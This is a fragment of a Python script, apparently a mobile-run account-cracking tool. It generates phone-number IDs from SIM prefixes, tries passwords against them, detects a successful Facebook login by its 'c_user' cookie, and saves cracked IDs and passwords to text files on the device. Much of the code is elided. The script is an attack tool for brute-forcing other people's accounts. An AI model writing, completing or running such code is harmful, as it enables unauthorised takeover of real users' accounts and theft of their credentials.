...
def Main():
	...
	print("<> \033[1;31m SIM CODE : [017 018 019 013 015 016] ")

	love = input('<> SELECT : ')

	print('<> \033[1;33m : [1000,5000,10000,15000,20000] ')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\33[1;92m[T-G-404-OK] '+cid+' ¤ '+ps+'\33[0;92m')

                oks.append(cid)

                open('/sdcard/T-G-404-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                ...
                print(f"\r\33[1;92m[T-G-404-CP] {uid} ¤ {ps}")

                open('/sdcard/T-G-404-CP.txt', 'a').write( uid+' | '+ps+' \n')
